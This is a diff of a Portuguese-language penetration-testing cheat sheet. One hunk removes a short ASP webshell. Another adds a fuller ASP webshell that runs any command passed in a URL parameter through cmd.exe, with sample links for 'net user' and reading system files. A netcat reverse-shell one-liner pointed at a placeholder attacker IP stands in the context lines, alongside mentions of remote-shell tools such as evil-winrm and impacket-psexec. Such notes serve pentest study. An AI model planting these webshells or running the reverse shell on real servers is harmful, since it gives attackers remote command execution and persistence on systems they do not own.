@@ -128,42 +128,7 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 	getCommandOutput = objCmdExec.StdOut.ReadAll
 	Response.Write getCommandOutput
 	%>
-
- 	<%
-	Dim cmd, output
-	cmd = Request.QueryString("cmd")
-	
-	If cmd <> "" Then
-	    On Error Resume Next
-	    Set oS = Server.CreateObject("WSCRIPT.SHELL")
-	    Set objCmdExec = oS.exec("cmd.exe /c " & cmd)
-	    output = objCmdExec.StdOut.ReadAll()
-	    
-	    If Err.Number <> 0 Then
-	        output = "Erro: " & Err.Description
-	    End If
-	    
-	    Response.Write Server.HTMLEncode(output)
-	    Response.End
-	End If
-	%>
-	
-	<html>
-	<head>
-	<title>Webshell ASP</title>
-	</head>
-	<body>
-	<form method="GET">
-	Comando: <input type="text" name="cmd" size="50" value="<%= Server.HTMLEncode(cmd) %>">
-	<input type="submit" value="Executar">
-	</form>
-	<pre>
-	<% If output <> "" Then Response.Write Server.HTMLEncode(output) %>
-	</pre>
-	</body>
-	</html>
-
-
+ 	
 .
 
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
@@ -5863,6 +5828,99 @@ Ferramenta de shell interativa web `WEEVELY`
 Ferramenta para shell interativa no windows `evil-winrm -i IP -u USER -p PASS` alternativa ao xfreerdp e rdesktop, também o `wmiexec` o `impacket-psexec` e `remmina`
 
 [Shell em asp shell.asp](https://medium.com/@viniciuskmax/backdoorando-o-iis-como-usar-uma-webshell-para-obter-persist%C3%AAncia-de-acesso-system-a-um-servidor-9180a20a1a49)
+
+WEB Shell em asp mais interativa
+
+	<%@ Language="VBScript" %>
+	<%
+	Function URLDecode(sText)
+	    Dim i, sDecoded, sEncoded
+	    sDecoded = ""
+	    
+	    For i = 1 To Len(sText)
+	        sEncoded = Mid(sText, i, 1)
+	        If sEncoded = "%" Then
+	            If i + 2 <= Len(sText) Then
+	                sDecoded = sDecoded & Chr(CLng("&H" & Mid(sText, i + 1, 2)))
+	                i = i + 2
+	            End If
+	        ElseIf sEncoded = "+" Then
+	            sDecoded = sDecoded & " "
+	        Else
+	            sDecoded = sDecoded & sEncoded
+	        End If
+	    Next
+	    
+	    URLDecode = sDecoded
+	End Function
+	
+	Function ExecuteCommand(cmd)
+	    On Error Resume Next
+	    Dim ws, exec, output
+	    
+	    Set ws = Server.CreateObject("WScript.Shell")
+	    If Err.Number <> 0 Then
+	        ExecuteCommand = "Erro: WScript.Shell não disponível"
+	        Exit Function
+	    End If
+	    
+	    Set exec = ws.Exec("cmd.exe /c " & cmd)
+	    If Err.Number <> 0 Then
+	        ExecuteCommand = "Erro ao executar comando: " & Err.Description
+	        Exit Function
+	    End If
+	    
+	    output = exec.StdOut.ReadAll()
+	    If output = "" Then output = exec.StdErr.ReadAll()
+	    If output = "" Then output = "Comando executado (sem saída)"
+	    
+	    ExecuteCommand = output
+	End Function
+	
+	' Processa o comando
+	Dim cmd, output
+	cmd = Request.QueryString("cmd")
+	
+	If cmd <> "" Then
+	    cmd = URLDecode(cmd)
+	    output = ExecuteCommand(cmd)
+	Else
+	    cmd = ""
+	    output = "Digite um comando no formulário abaixo"
+	End If
+	%>
+	
+	<html>
+	<head>
+	<title>Webshell ASP</title>
+	<style>
+	body { font-family: Arial, sans-serif; margin: 20px; }
+	pre { background: #f0f0f0; padding: 10px; border-radius: 5px; }
+	input[type="text"] { width: 400px; padding: 5px; }
+	input[type="submit"] { padding: 5px 15px; }
+	</style>
+	</head>
+	<body>
+	<h2>Webshell ASP</h2>
+	<form method="GET">
+	Comando: <input type="text" name="cmd" value="<%= Server.HTMLEncode(cmd) %>">
+	<input type="submit" value="Executar">
+	</form>
+	
+	<% If output <> "" Then %>
+	<h3>Resultado:</h3>
+	<pre><%= Server.HTMLEncode(output) %></pre>
+	<% End If %>
+	
+	<h3>Exemplos:</h3>
+	<ul>
+	<li><a href="?cmd=dir%20c:\">dir c:\</a></li>
+	<li><a href="?cmd=ipconfig%20/all">ipconfig /all</a></li>
+	<li><a href="?cmd=net%20user">net user</a></li>
+	<li><a href="?cmd=type%20c:\windows\win.ini">type c:\windows\win.ini</a></li>
+	</ul>
+	</body>
+	</html>
 
 
 - INFORMATION GATHERING
